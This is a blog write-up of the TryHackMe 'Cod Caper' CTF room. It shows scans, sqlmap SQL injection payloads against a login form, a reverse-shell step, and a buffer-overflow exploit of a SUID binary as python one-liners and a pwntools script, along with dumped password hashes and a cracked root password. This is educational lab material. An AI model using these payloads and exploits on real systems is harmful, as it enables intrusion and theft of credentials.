
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>thecodcaper CTF | write-up</title>
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=0a4893ecd9">

    <link rel="icon" href="../favicon.png" type="image/png">
    <link rel="canonical" href="index.html">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="amp/index.html">
    
    <meta property="og:site_name" content="fr33s0ul">
    <meta property="og:type" content="article">
    <meta property="og:title" content="thecodcaper CTF | write-up">
    <meta property="og:description" content="Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope">
    <meta property="og:url" content="https://fr33s0ul.tech/thecodca/">
    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png">
    <meta property="article:published_time" content="2020-04-14T18:52:00.000Z">
    <meta property="article:modified_time" content="2020-04-17T14:53:43.000Z">
    <meta property="article:tag" content="CTF">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="thecodcaper CTF | write-up">
    <meta name="twitter:description" content="Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope">
    <meta name="twitter:url" content="https://fr33s0ul.tech/thecodca/">
    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="fr33s0ul">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="CTF">
    <meta name="twitter:site" content="@fr33soul_">
    <meta name="twitter:creator" content="@fr33soul_">
    <meta property="og:image:width" content="725">
    <meta property="og:image:height" content="465">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "fr33s0ul",
        "url": "https://fr33s0ul.tech/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/logo.gif",
            "width": 300,
            "height": 41
        }
    },
    "author": {
        "@type": "Person",
        "name": "fr33s0ul",
        "image": {
            "@type": "ImageObject",
            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/asdasd.gif",
            "width": 600,
            "height": 594
        },
        "url": "https://fr33s0ul.tech/author/fr33s0ul/",
        "sameAs": [
            "https://twitter.com/fr33soul_"
        ]
    },
    "headline": "thecodcaper CTF | write-up",
    "url": "https://fr33s0ul.tech/thecodca/",
    "datePublished": "2020-04-14T18:52:00.000Z",
    "dateModified": "2020-04-17T14:53:43.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/pgn.png",
        "width": 725,
        "height": 465
    },
    "keywords": "CTF",
    "description": "Hello everyone, today&#x27;s CTF is so impressive, not rated yet but from my little\nexperience I can tell there&#x27;s no easy or hard challenge, it&#x27;s all about how\nout-of-the-box can you think. but no worries this one does have hints and the\ntechniques are provided with the questioner. anyways! hope you guys enjoy this\nwrite-up, Let&#x27;s enumerate machine!\n\n [https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV]\n\nroot@kali:~# nmap -sV -sC 10.10.201.143\nStarting Nmap 7.80 ( https://nmap.org ) ",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://fr33s0ul.tech/"
    }
}
    </script>

    <meta name="generator" content="Ghost 3.38">
    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../rss/index.html">
    <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-111725042-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-111725042-2');
</script>

</head>
<body class="post-template tag-ctf">

    <div class="site-wrapper">

        

<header class="site-header">
    <div class="outer site-nav-main">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left-wrapper">
        <div class="site-nav-left">
                <a class="site-nav-logo" href="../"><img src="../content/images/size/w1000/2020/03/logo.gif" alt="fr33s0ul"></a>
            <div class="site-nav-content">
                    <ul class="nav">
    <li class="nav-home"><a href="../">Home</a></li>
    <li class="nav-whoami"><a href="../whoami/">whoami</a></li>
    <li class="nav-whispers"><a href="../whispers/">Whispers</a></li>
    <li class="nav-ai"><a href="../tag/ai/">Ai</a></li>
    <li class="nav-ctf"><a href="../tag/ctf/">CTF</a></li>
</ul>

                    <span class="nav-post-title ">thecodcaper CTF | write-up</span>
            </div>
        </div>
    </div>
    <div class="site-nav-right">
            <div class="social-links">
                    <a class="social-link social-link-tw" href="https://twitter.com/fr33soul_" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
</a>
            </div>
                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://fr33s0ul.tech/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
</a>

    </div>
</nav>
    </div>
</div></header>


<main id="site-main" class="site-main outer">
    <div class="inner">

        <article class="post-full post tag-ctf ">

            <header class="post-full-header">

                <section class="post-full-tags">
                    <a href="../tag/ctf/">CTF</a>
                </section>

                <h1 class="post-full-title">thecodcaper CTF | write-up</h1>


                <div class="post-full-byline">

                    <section class="post-full-byline-content">

                        <ul class="author-list">
                            <li class="author-list-item">

                                <div class="author-card">
                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
                                    <div class="author-info">
                                        <h2>fr33s0ul</h2>
                                        <p>Read <a href="../author/fr33s0ul/">more posts</a> by this author.</p>
                                    </div>
                                </div>

                                <a href="../author/fr33s0ul/" class="author-avatar">
                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
                                </a>

                            </li>
                        </ul>

                        <section class="post-full-byline-meta">
                            <h4 class="author-name"><a href="../author/fr33s0ul/">fr33s0ul</a></h4>
                            <div class="byline-meta-content">
                                <time class="byline-meta-date" datetime="2020-04-14">14 Apr 2020</time>
                                <span class="byline-reading-time"><span class="bull">â€¢</span> 9 min read</span>
                            </div>
                        </section>

                    </section>


                </div>
            </header>

            <figure class="post-full-image">
                <img srcset="../content/images/size/w300/2020/04/pgn.png 300w,
                           ../content/images/size/w600/2020/04/pgn.png 600w,
                          ../content/images/size/w1000/2020/04/pgn. png 1000w,
                         ../content/images/size/w2000/2020/04/pgn. png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="../content/images/size/w2000/2020/04/pgn.png" alt="thecodcaper CTF | write-up">
            </figure>

            <section class="post-full-content">
                <div class="post-content">
                    <p>Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope you guys enjoy this write-up, Let's enumerate machine!</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/jVZmRHItLSlGE1SYBV" width="480" height="273" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV"></a></p><!--kg-card-end: html--><pre><code>root@kali:~# nmap -sV -sC 10.10.201.143
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 09:50 UTC
Nmap scan report for ip-10-10-201-143.eu-west-1.compute.internal (10.10.201.143)
Host is up (0.0018s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:8C:7D:6E:AC:54 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
root@kali:~# 
</code></pre><pre><code>root@kali:~# gobuster dir -u http://10.10.201.143/ -w /usr/share/dirb/wordlists/big.txt -x .php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.201.143/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/10 09:53:19 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/administrator.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/04/10 09:53:22 Finished
===============================================================
root@kali:~#</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-10.56.10.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-10.57.37.png" class="kg-image"></figure><p>So what's happening is that we will try to do a SQL injection in the POST data, we saved the request from burp and passed it to sqlmap</p><pre><code>root@kali:~# sqlmap -r request.txt --dbs
        ___
       __H__                                                                        
 ___ ___["]_____ ___ ___  {1.4#stable}                                              
|_ -| . [)]     | .'| . |                                                           
|___|_  [)]_|_|_|__,|  _|                                                           
      |_|V...       |_|   http://sqlmap.org                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:02:28 /2020-04-10/

[10:02:28] [INFO] parsing HTTP request from 'request.txt'
[10:02:28] [INFO] resuming back-end DBMS 'mysql' 
[10:02:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=admin' RLIKE (SELECT (CASE WHEN (7708=7708) THEN 0x61646d696e ELSE 0x28 END))-- MUAf&amp;password=pass

    Type: error-based
    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' OR (SELECT 1403 FROM(SELECT COUNT(*),CONCAT(0x71706a6271,(SELECT (ELT(1403=1403,1))),0x716b627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- staB&amp;password=pass

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 3219 FROM (SELECT(SLEEP(5)))CJGe)-- kkog&amp;password=pass
---
[10:02:28] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;= 5.0
[10:02:28] [INFO] fetching database names
[10:02:28] [INFO] used SQL query returns 5 entries
[10:02:28] [INFO] resumed: 'information_schema'
[10:02:28] [INFO] resumed: 'mysql'
[10:02:28] [INFO] resumed: 'performance_schema'
[10:02:28] [INFO] resumed: 'sys'
[10:02:28] [INFO] resumed: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[10:02:28] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.201.143'                                                                          
[10:02:28] [WARNING] you haven't updated sqlmap for more than 99 days!!!

[*] ending @ 10:02:28 /2020-04-10/

root@kali:~# 
</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-11.03.59.png" class="kg-image"></figure><p>and we logged in with the credentials we got from the SQL injection, but the fun doesn't end there, we have a command prompt interacting with user <strong>www-data</strong>, we definitely can do something about it.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-11.08.08.png" class="kg-image"></figure><p>after digging a little bit, I found the <strong>SSH</strong> private key to the user in the machine, thought why not! let's enter from the front door.</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/EsmlrgWNx5v0Y" width="480" height="433" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/what-whatever-shrug-EsmlrgWNx5v0Y"></a></p><!--kg-card-end: html--><figure class="kg-card kg-code-card"><pre><code>root@kali:~# vim id_rsa
root@kali:~# locate ssh2john
/usr/share/john/ssh2john.py
root@kali:~# /usr/share/john/ssh2john.py id_rsa 
id_rsa has no password!
root@kali:~# 
</code></pre><figcaption>Great! no password ðŸ‘Œ</figcaption></figure><p>But the issue here, when I tried to ssh to the machine, didn't let me in, it kept asking for the password, the next thing I thought about is a <strong>REVERSE SHELL</strong> from the command prompt!</p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/yoJC2GnSClbPOkV0eA" width="480" height="401" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/excited-birthday-yeah-yoJC2GnSClbPOkV0eA"></a></p><!--kg-card-end: html--><p>so I managed to make a simple one with <strong>echo</strong> in the <strong>/tmp</strong> file, I managed to run it, and get a reverse shell from the user <strong>www-data</strong></p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-11.24.12.png" class="kg-image"></figure><p>I then did some enumeration for files that are running as root for our user, to see if we can escalate. I used <strong><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a></strong> which is the new version of <strong>LinEnum</strong>.</p><p>we found an interesting file called <strong>root</strong> in <strong>/opt/secret/</strong> and as explained by the CTF maker,<strong>"</strong> The SUID file we found seems to expect 32 characters of input, and then immediately exits. This seems to warrant further investigation. Luckily I was practicing binary exploitation back when I was using that PC, so I have tools preinstalled to examine. One of those tools is pwndbg, a plugin for GDB which allows you to better examine binary files.</p><p>Run <code>gdb /opt/secret/root</code> and you should see a screen similar to this</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-12.25.44.png" class="kg-image"></figure><p>This means that pwndbg has successfully been initialized. The next step is to test if anything happens when you send more then 32 characters. To do this type <code>r &lt; &lt;(cyclic 50)</code>, that command runs the program and provides 50 characters worth of "cyclic" input.</p><p>Cyclic input goes like this: "aaaaaaaabaaacaaadaaaeaaaf" etc. Because it's in this "cyclic" format, it allows us to better understand the control we have over certain registers, for reasons you are about to see.</p><p>Once you run that command you should see something similar to this screen</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-12.26.02.png" class="kg-image"></figure><p>Now this is where some knowledge of assembly helps. It seems that in this case we're able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we're able to overwrite it, we can theoretically execute any part of the program at any time. Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we're able to calculate exactly how many characters we need to provide before we can overwrite EIP. Luckily cyclic provides this functionality with the -l flag, running cyclic -l {fault address} will tell us exactly how many characters we need to provide we can overwrite EIP.</p><p>Running <code>cyclic -l 0x6161616c</code> outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.<br>That's all we needed for pre-explotation!</p><p>Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up.</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-10-at-12.26.18.png" class="kg-image"></figure><p>What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!<br>Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408" We can use python to do this, as it allows a nice way of converting.</p><p>Method 1 - Manual conversion:<br><code>python -c 'print "A"*44 + "\xcb\x84\x04\x08"'</code> will output the payload we want, but it requires manually converting to little endian</p><p>Method 2 - Struct:<br><code>python -c 'import struct;print "A"*44 + struct.pack("&lt;I",0x080484cb")'</code><br>It requires importing a module but struct.pack allows us to automatically convert memory to little endian. <br>We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary<br><code>python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root</code><br>should provide you with this output.</p><pre><code>www-data@ubuntu:/opt/secret$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root    
&lt;$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root          
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Illegal instruction
www-data@ubuntu:/opt/secret$ su root
su root
Password: love2fish

root@ubuntu:/opt/secret#id
uid=0(root) gid=0(root) groups=0(root)</code></pre><p>Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.<br>We start off the script with:</p><p><code>from pwn import *</code><br><code>proc = process('/opt/secret/root')</code></p><p>This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.</p><p>We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.<br>With the ELF addition our script becomes<br><code>from pwn import *</code><br><code>proc = process('/opt/secret/root')</code><br><code>elf = ELF('/opt/secret/root')</code><br><code>shell_func = elf.symbols.shell</code><br>shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().</p><p>fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our <code>proc</code> variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.<br>With all that our final exploit script becomes<br><code>from pwn import *</code><br><code>proc = process('/opt/secret/root')</code><br><code>elf = ELF('/opt/secret/root')</code><br><code>shell_func = elf.symbols.shell</code><br><code>payload = fit({</code><br><code>44: shell_func # this adds the value of shell_func after 44 characters</code><br><code>})</code><br><code>proc.sendline(payload)</code><br><code>proc.interactive()</code><br>Save that to a .py file and run it, and you should get this output:</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-14-at-19.38.53.png" class="kg-image"></figure><p>Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is <code>$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.</code><strong>"</strong></p><p>Happy hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | The Cod Caper</div><div class="kg-bookmark-description">A guided room taking you through infiltrating and exploiting a Linux system.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png"><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | Hacking Training</div><div class="kg-bookmark-description">An online platform for learning and teaching cyber security, all through your browser.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png"><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://tryhackme.com/img/favicon.png"></div></a></figure><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/123GivAQB7k0s8" width="480" height="277" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/the-penguin-123GivAQB7k0s8"></a></p><!--kg-card-end: html-->
                </div>
            </section>



        </article>

    </div>
</main>

<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
                <article class="read-next-card">
                    <header class="read-next-card-header">
                        <h3><span>More in</span> <a href="../tag/ctf/">CTF</a></h3>
                    </header>
                    <div class="read-next-card-content">
                        <ul>
                            <li>
                                <h4><a href="../yearoftherabbit-ctf-write-up/">YearOfTheRabbit | CTF write-up</a></h4>
                                <div class="read-next-card-meta">
                                    <p><time datetime="2020-04-22">22 Apr 2020</time> â€“
                                        9 min read</p>
                                </div>
                            </li>
                            <li>
                                <h4><a href="../dogcat-thm-write-up/">dogcat | THM write-up</a></h4>
                                <div class="read-next-card-meta">
                                    <p><time datetime="2020-04-19">19 Apr 2020</time> â€“
                                        6 min read</p>
                                </div>
                            </li>
                            <li>
                                <h4><a href="../lfi/">Local file inclusion | write-up</a></h4>
                                <div class="read-next-card-meta">
                                    <p><time datetime="2020-04-17">17 Apr 2020</time> â€“
                                        6 min read</p>
                                </div>
                            </li>
                        </ul>
                    </div>
                    <footer class="read-next-card-footer">
                        <a href="../tag/ctf/">See all 15 posts
                            â†’</a>
                    </footer>
                </article>

                <article class="post-card post tag-ctf ">

    <a class="post-card-image-link" href="../attacktive-directory-thm-write-up/">
        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/aD.png 300w,
                   ../content/images/size/w600/2020/04/aD.png 600w,
                  ../content/images/size/w1000/2020/04/aD. png 1000w,
                 ../content/images/size/w2000/2020/04/aD. png 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/aD.png" alt="Attacktive Directory | THM write-up">
    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="../attacktive-directory-thm-write-up/">

            <header class="post-card-header">
                    <div class="post-card-primary-tag">CTF</div>
                <h2 class="post-card-title">Attacktive Directory | THM write-up</h2>
            </header>

            <section class="post-card-excerpt">
                    <p>Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called Sp00ky. in my opinion,</p>
            </section>

        </a>

        <footer class="post-card-meta">
            <ul class="author-list">
                <li class="author-list-item">
            
                    <div class="author-name-tooltip">
                        fr33s0ul
                    </div>
            
                    <a href="../author/fr33s0ul/" class="static-avatar">
                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
                    </a>
                </li>
            </ul>
            <div class="post-card-byline-content">
                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
                <span class="post-card-byline-date"><time datetime="2020-04-17">17 Apr 2020</time> <span class="bull">â€¢</span> 23 min read</span>
            </div>
        </footer>

    </div>

</article>

                <article class="post-card post tag-ctf ">

    <a class="post-card-image-link" href="../bebop-drone-lovers-ctf/">
        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/Dr63yPm.png 300w,
                   ../content/images/size/w600/2020/04/Dr63yPm.png 600w,
                  ../content/images/size/w1000/2020/04/Dr63yPm. png 1000w,
                 ../content/images/size/w2000/2020/04/Dr63yPm. png 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/Dr63yPm.png" alt="bebop | drone lovers CTF">
    </a>

    <div class="post-card-content">

        <a class="post-card-content-link" href="../bebop-drone-lovers-ctf/">

            <header class="post-card-header">
                    <div class="post-card-primary-tag">CTF</div>
                <h2 class="post-card-title">bebop | drone lovers CTF</h2>
            </header>

            <section class="post-card-excerpt">
                    <p>Hello everyone, Today's CTF is available at www.Tryhackme.com rated as an easy challenge so it won't be hard for someone just starting in the field, the concept is</p>
            </section>

        </a>

        <footer class="post-card-meta">
            <ul class="author-list">
                <li class="author-list-item">
            
                    <div class="author-name-tooltip">
                        fr33s0ul
                    </div>
            
                    <a href="../author/fr33s0ul/" class="static-avatar">
                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
                    </a>
                </li>
            </ul>
            <div class="post-card-byline-content">
                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
                <span class="post-card-byline-date"><time datetime="2020-04-13">13 Apr 2020</time> <span class="bull">â€¢</span> 3 min read</span>
            </div>
        </footer>

    </div>

</article>
        </div>
    </div>
</aside>




        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="../">fr33s0ul</a> Â© 2020</section>
                <nav class="site-footer-nav">
                    <a href="../">Latest Posts</a>
                    
                    <a href="https://twitter.com/fr33soul_" target="_blank" rel="noopener">Twitter</a>
                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
                </nav>
            </div>
        </footer>

    </div>


    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
    </script>
    <script src="../assets/built/casper.js?v=0a4893ecd9"></script>

    <script>
        // Parse the URL parameter
        function getParameterByName(name, url) {
            if (!url) url = window.location.href;
            name = name.replace(/[\[\]]/g, "\\$&");
            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, " "));
        }

        // Give the parameter a variable name
        var action = getParameterByName('action');
        var success = getParameterByName('success');

        $(document).ready(function () {
            if (action == 'subscribe' && (success === null || success === 'true')) {
                $('body').addClass('subscribe-success');
            }

            if (action == 'subscribe' && success === 'false') {
                $('body').addClass('subscribe-failure');
            }

            $('.subscribe-notification .subscribe-close-button').click(function () {
                $('.subscribe-notification').addClass('close');
            });

            // Reset form on opening subscrion overlay
            $('.subscribe-button').click(function() {
                $('.subscribe-overlay form').removeClass();
                $('.subscribe-email').val('');
            });
        });
    </script>

    <script>
    $(document).ready(function () {
        // FitVids - start
        var $postContent = $(".post-full-content");
        $postContent.fitVids();
        // FitVids - end

        // Replace nav with title on scroll - start
        Casper.stickyNavTitle({
            navSelector: '.site-nav-main',
            titleSelector: '.post-full-title',
            activeClass: 'nav-post-title-active'
        });
        // Replace nav with title on scroll - end

        // Hover on avatar
        var hoverTimeout;
        $('.author-list-item').hover(function () {
            var $this = $(this);

            clearTimeout(hoverTimeout);

            $('.author-card').removeClass('hovered');
            $(this).children('.author-card').addClass('hovered');

        }, function () {
            var $this = $(this);

            hoverTimeout = setTimeout(function () {
                $this.children('.author-card').removeClass('hovered');
            }, 800);
        });
    });
</script>


    

</body>
